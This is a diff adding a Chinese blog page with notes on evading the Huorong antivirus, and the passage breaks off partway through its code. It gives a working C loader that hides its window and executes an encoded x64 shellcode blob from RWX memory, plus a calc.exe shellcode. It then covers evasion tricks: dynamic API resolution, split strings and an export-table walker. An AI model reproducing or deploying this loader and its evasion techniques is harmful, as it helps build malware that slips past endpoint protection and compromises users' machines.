@@ -1,0 +1,287 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>免杀过火绒思路整理 | DDL'S BLOG</title><meta name="author" content="DDL"><meta name="copyright" content="DDL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="免杀过火绒思路整理官方文档1https:&#x2F;&#x2F;learn.microsoft.com&#x2F;zh-cn&#x2F;windows&#x2F;win32&#x2F;api&#x2F;memoryapi&#x2F;nf-memoryapi-virtualprotect  大白哥基础码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849">
+<meta property="og:type" content="article">
+<meta property="og:title" content="免杀过火绒思路整理">
+<meta property="og:url" content="http://example.com/2025/04/27/%E5%85%8D%E6%9D%80%E8%BF%87%E7%81%AB%E7%BB%92%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/index.html">
+<meta property="og:site_name" content="DDL&#39;S BLOG">
+<meta property="og:description" content="免杀过火绒思路整理官方文档1https:&#x2F;&#x2F;learn.microsoft.com&#x2F;zh-cn&#x2F;windows&#x2F;win32&#x2F;api&#x2F;memoryapi&#x2F;nf-memoryapi-virtualprotect  大白哥基础码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/avatar.png">
+<meta property="article:published_time" content="2025-04-27T08:28:12.000Z">
+<meta property="article:modified_time" content="2025-04-27T08:34:32.802Z">
+<meta property="article:author" content="DDL">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="http://example.com/2025/04/27/%E5%85%8D%E6%9D%80%E8%BF%87%E7%81%AB%E7%BB%92%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '免杀过火绒思路整理',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">DDL'S BLOG</span></a><a class="nav-page-title" href="/"><span class="site-name">免杀过火绒思路整理</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">免杀过火绒思路整理</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-04-27T08:28:12.000Z" title="Created 2025-04-27 16:28:12">2025-04-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-04-27T08:34:32.802Z" title="Updated 2025-04-27 16:34:32">2025-04-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91/">内网</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">2.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>12mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="免杀过火绒思路整理"><a href="#免杀过火绒思路整理" class="headerlink" title="免杀过火绒思路整理"></a>免杀过火绒思路整理</h1><h2 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect</span><br></pre></td></tr></table></figure>
+
+<h2 id="大白哥基础码"><a href="#大白哥基础码" class="headerlink" title="大白哥基础码"></a>大白哥基础码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt; // Windows API 和 一些常量</span><br><span class="line">#include &lt;stdio.h&gt; // 标准输入输出库的头文件</span><br><span class="line">#pragma comment(linker,&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;) // 不显示黑窗</span><br><span class="line"></span><br><span class="line">unsigned char buf[] =</span><br><span class="line">&quot;\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef&quot;</span><br><span class="line">&quot;\xff\xff\xff\x48\xbb\xa3\x17\x43\x94\x5c\x7f\x96\x58\x48&quot;</span><br><span class="line">&quot;\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x5f\x5f\xc0&quot;</span><br><span class="line">&quot;\x70\xac\x97\x56\x58\xa3\x17\x02\xc5\x1d\x2f\xc4\x09\xf5&quot;</span><br><span class="line">&quot;\x5f\x72\x46\x39\x37\x1d\x0a\xc3\x5f\xc8\xc6\x44\x37\x1d&quot;</span><br><span class="line">&quot;\x0a\x83\x5f\xc8\xe6\x0c\x37\x99\xef\xe9\x5d\x0e\xa5\x95&quot;</span><br><span class="line">&quot;\x37\xa7\x98\x0f\x2b\x22\xe8\x5e\x53\xb6\x19\x62\xde\x4e&quot;</span><br><span class="line">&quot;\xd5\x5d\xbe\x74\xb5\xf1\x56\x12\xdc\xd7\x2d\xb6\xd3\xe1&quot;</span><br><span class="line">&quot;\x2b\x0b\x95\x8c\xf4\x16\xd0\xa3\x17\x43\xdc\xd9\xbf\xe2&quot;</span><br><span class="line">&quot;\x3f\xeb\x16\x93\xc4\xd7\x37\x8e\x1c\x28\x57\x63\xdd\x5d&quot;</span><br><span class="line">&quot;\xaf\x75\x0e\xeb\xe8\x8a\xd5\xd7\x4b\x1e\x10\xa2\xc1\x0e&quot;</span><br><span class="line">&quot;\xa5\x95\x37\xa7\x98\x0f\x56\x82\x5d\x51\x3e\x97\x99\x9b&quot;</span><br><span class="line">&quot;\xf7\x36\x65\x10\x7c\xda\x7c\xab\x52\x7a\x45\x29\xa7\xce&quot;</span><br><span class="line">&quot;\x1c\x28\x57\x67\xdd\x5d\xaf\xf0\x19\x28\x1b\x0b\xd0\xd7&quot;</span><br><span class="line">&quot;\x3f\x8a\x11\xa2\xc7\x02\x1f\x58\xf7\xde\x59\x73\x56\x1b&quot;</span><br><span class="line">&quot;\xd5\x04\x21\xcf\x02\xe2\x4f\x02\xcd\x1d\x25\xde\xdb\x4f&quot;</span><br><span class="line">&quot;\x37\x02\xc6\xa3\x9f\xce\x19\xfa\x4d\x0b\x1f\x4e\x96\xc1&quot;</span><br><span class="line">&quot;\xa7\x5c\xe8\x1e\xdd\xe2\x08\xe5\x6a\xfc\x24\x71\x94\x5c&quot;</span><br><span class="line">&quot;\x3e\xc0\x11\x2a\xf1\x0b\x15\xb0\xdf\x97\x58\xa3\x5e\xca&quot;</span><br><span class="line">&quot;\x71\x15\xc3\x94\x58\xa2\xab\x83\x95\x5d\x7b\xd7\x0c\xea&quot;</span><br><span class="line">&quot;\x9e\xa7\xd8\xd5\x8e\xd7\xe2\xef\x60\x65\x93\xa3\xaa\xda&quot;</span><br><span class="line">&quot;\xd1\x49\x7f\x42\x95\x5c\x7f\xcf\x19\x19\x3e\xc3\xff\x5c&quot;</span><br><span class="line">&quot;\x80\x43\x08\xf3\x5a\x72\x5d\x11\x4e\x56\x10\x5c\xd7\x0b&quot;</span><br><span class="line">&quot;\x1d\x9e\x37\x69\x98\xeb\x9e\x82\xd5\xe6\x95\x99\x87\x43&quot;</span><br><span class="line">&quot;\xe8\x96\xdc\xd5\xb8\xfc\x48\xe2\x4f\x0f\x1d\xbe\x37\x1f&quot;</span><br><span class="line">&quot;\xa1\xe2\xad\xda\x31\x28\x1e\x69\x8d\xeb\x96\x87\xd4\x5e&quot;</span><br><span class="line">&quot;\x7f\x96\x11\x1b\x74\x2e\xf0\x5c\x7f\x96\x58\xa3\x56\x13&quot;</span><br><span class="line">&quot;\xd5\x0c\x37\x1f\xba\xf4\x40\x14\xd9\x6d\xbf\xfc\x55\xfa&quot;</span><br><span class="line">&quot;\x56\x13\x76\xa0\x19\x51\x1c\x87\x43\x42\x95\x14\xf2\xd2&quot;</span><br><span class="line">&quot;\x7c\xbb\xd1\x43\xfc\x14\xf6\x70\x0e\xf3\x56\x13\xd5\x0c&quot;</span><br><span class="line">&quot;\x3e\xc6\x11\x5c\xd7\x02\xc4\x15\x80\x5e\x15\x2a\xd6\x0f&quot;</span><br><span class="line">&quot;\x1d\x9d\x3e\x2c\x21\x6f\x28\xc5\x6b\x89\x37\xa7\x8a\xeb&quot;</span><br><span class="line">&quot;\xe8\x89\x1f\x52\x3e\x2c\x50\x24\x0a\x23\x6b\x89\xc4\x66&quot;</span><br><span class="line">&quot;\xed\x01\x41\x02\x2e\xfa\xea\x2b\xc5\x5c\xc2\x0b\x17\x98&quot;</span><br><span class="line">&quot;\x57\xaa\x5e\xdf\x1d\xc3\x6f\xbc\x0a\x93\xe3\xe4\x04\x31&quot;</span><br><span class="line">&quot;\xfb\x36\x7f\xcf\x19\x2a\xcd\xbc\x41\x5c\x7f\x96\x58&quot;;</span><br><span class="line">void main() &#123;</span><br><span class="line">	// 使用VirtualAlloc 函数申请一个 shellcode字节大小的可以执行代码的内存块</span><br><span class="line">	LPVOID exec = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">		PAGE_EXECUTE_READWRITE);</span><br><span class="line">	// 申请失败 , 退出</span><br><span class="line">	if (exec == NULL) &#123;</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	// 把shellcode拷贝到这块内存</span><br><span class="line">	memcpy(exec, buf, sizeof(buf));</span><br><span class="line">	// 创建线程运行</span><br><span class="line">	HANDLE hThread = CreateThread(</span><br><span class="line">		NULL,</span><br><span class="line">		NULL,</span><br><span class="line">		(LPTHREAD_START_ROUTINE)exec,</span><br><span class="line">		NULL,</span><br><span class="line">		NULL,</span><br><span class="line">		0);</span><br><span class="line">	// 等待线程运行</span><br><span class="line">	WaitForSingleObject(hThread, -1);</span><br><span class="line">	// 关闭线程</span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="弹计算器"><a href="#弹计算器" class="headerlink" title="弹计算器"></a>弹计算器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">unsigned char buf[] =</span><br><span class="line">	&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&quot;</span><br><span class="line">	&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;</span><br><span class="line">	&quot;\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a&quot;</span><br><span class="line">	&quot;\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;</span><br><span class="line">	&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;</span><br><span class="line">	&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48&quot;</span><br><span class="line">	&quot;\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40&quot;</span><br><span class="line">	&quot;\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48&quot;</span><br><span class="line">	&quot;\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41&quot;</span><br><span class="line">	&quot;\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1&quot;</span><br><span class="line">	&quot;\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c&quot;</span><br><span class="line">	&quot;\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span><br><span class="line">	&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a&quot;</span><br><span class="line">	&quot;\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b&quot;</span><br><span class="line">	&quot;\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;</span><br><span class="line">	&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b&quot;</span><br><span class="line">	&quot;\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd&quot;</span><br><span class="line">	&quot;\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0&quot;</span><br><span class="line">	&quot;\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff&quot;</span><br><span class="line">	&quot;\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><table>
+<thead>
+<tr>
+<th>区段</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>.text</code></td>
+<td>代码段：main 等</td>
+</tr>
+<tr>
+<td><code>.data</code></td>
+<td>数据段：globalData</td>
+</tr>
+<tr>
+<td><code>.rdata</code></td>
+<td>只读数据（字符串常量、导入表等）</td>
+</tr>
+<tr>
+<td><code>.idata</code></td>
+<td>导入表</td>
+</tr>
+</tbody></table>
+<h2 id="一自定义函数"><a href="#一自定义函数" class="headerlink" title="一自定义函数"></a>一自定义函数</h2><h3 id="直接使用函数（静态调用）"><a href="#直接使用函数（静态调用）" class="headerlink" title="直接使用函数（静态调用）"></a>直接使用函数（静态调用）</h3><p>编译器会在可执行文件的导入表（Import Table）中记录这个函数。</p>
+<p>系统在程序启动时自动加载 DLL（比如 <code>kernel32.dll</code>）并解析函数地址。</p>
+<h3 id="用-GetProcAddress-函数指针（动态调用）"><a href="#用-GetProcAddress-函数指针（动态调用）" class="headerlink" title="用 GetProcAddress + 函数指针（动态调用）"></a>用 GetProcAddress + 函数指针（动态调用）</h3><p>程序运行时才去找函数地址</p>
+<p>不在导入表里（更难被静态检测）</p>
+<h3 id="自定义函数指针"><a href="#自定义函数指针" class="headerlink" title="自定义函数指针"></a>自定义函数指针</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VirtualAlloc</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef LPVOID(WINAPI* aVirtualAlloc)(</span><br><span class="line">    LPVOID lpAddress,</span><br><span class="line">    SIZE_T dwSize,</span><br><span class="line">    DWORD  flAllocationType,</span><br><span class="line">    DWORD  flProtect</span><br><span class="line">    );</span><br><span class="line">aVirtualAlloc MyVirtualAlloc = (aVirtualAlloc)GetProcAddress(LoadLibrary(L&quot;kerner32.dll&quot;), &quot;VirtualAlloc&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>句柄 (Handle)	一个”抽象编号”	操作系统内部用的“编号”，不是地址，不能直接拿来访问内存。<br>基址 (Base Address)	模块加载到内存的起始地址	一个真实的内存地址，可以直接访问模块内容（比如kernel32.dll的加载地址）。<br>地址 (Address)	任何一个内存位置	可以是任意对象、函数、数据、变量的内存位置。</p>
+<table>
+<thead>
+<tr>
+<th>句柄类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>HANDLE（比如文件、进程、线程、互斥体）</td>
+<td>是一个 “系统内核对象句柄”，本质是索引或指针，不能直接解引用。</td>
+</tr>
+<tr>
+<td><strong>HMODULE</strong>（模块句柄）</td>
+<td>是一个<strong>内存中的真实基址地址</strong>，可以直接当作指针来用。</td>
+</tr>
+</tbody></table>
+<p>rdata段的关键字绕过</p>
+<p>编译器通常会对字符串字面量保留在 .rdata（只读数据段）中，这样可以在调试工具或二进制中看到它。</p>
+<p>编译器会把它放在 <strong>PE 文件的 <code>.rdata</code>（只读数据）段</strong>。</p>
+<ul>
+<li>char kn[] &#x3D; { ‘k’, ‘e’, ‘r’, ‘n’, ‘e’, ‘l’, ‘3’, ‘2’, ‘.’, ‘d’, ‘l’, ‘l’, 0 };</li>
+<li>char use3[] &#x3D; { ‘V’, ‘i’, ‘r’, ‘t’, ‘u’, ‘a’, ‘l’, ‘A’, ‘l’, ‘l’, ‘o’, ‘c’, 0 };</li>
+</ul>
+<h2 id="二遍历导出表"><a href="#二遍历导出表" class="headerlink" title="二遍历导出表"></a>二遍历导出表</h2><p>hModule参数是加载的DLL的基址。这是在进程的地址空间中找到的DLL模块的地址</p>
+<h3 id="VA"><a href="#VA" class="headerlink" title="VA"></a>VA</h3><p>VA (virtual Address) 虚拟地址的意思 ,</p>
+<h3 id="RVA"><a href="#RVA" class="headerlink" title="RVA"></a>RVA</h3><p>RVA(relative Virtual Address) 相对虚拟地址偏移</p>
+<h3 id="序数"><a href="#序数" class="headerlink" title="序数"></a>序数</h3><p>函数的序号是一个整数值，表示该函数在 DLL 中的导出函数表中的位置。导出表被组织为函数指针的 列表（数组），每个函数根据其在表中的位置被分配一个序号值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;intrin.h&gt;</span><br><span class="line">#include &lt;WinBase.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName) &#123;</span><br><span class="line"></span><br><span class="line">    // 避免每次使用&#x27;hModule&#x27;时进行强制类型转换。</span><br><span class="line">    PBYTE pBase = (PBYTE)hModule;</span><br><span class="line"></span><br><span class="line">    // 获取DOS头并执行签名检查</span><br><span class="line">    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;</span><br><span class="line">    if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">        return NULL;</span><br><span class="line"></span><br><span class="line">    // 获取NT标头并执行签名检查 Nt头=dll基址+Dos头</span><br><span class="line">    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">    if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">        return NULL;</span><br><span class="line"></span><br><span class="line">    // 获取可选标头</span><br><span class="line">    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-&gt;OptionalHeader;</span><br><span class="line"></span><br><span class="line">    // 获取图像导出表</span><br><span class="line">    // 这是导出目录</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">    //PE（Portable Executable）文件格式中的一个字段，它指向程序的 导出表（Export Table） 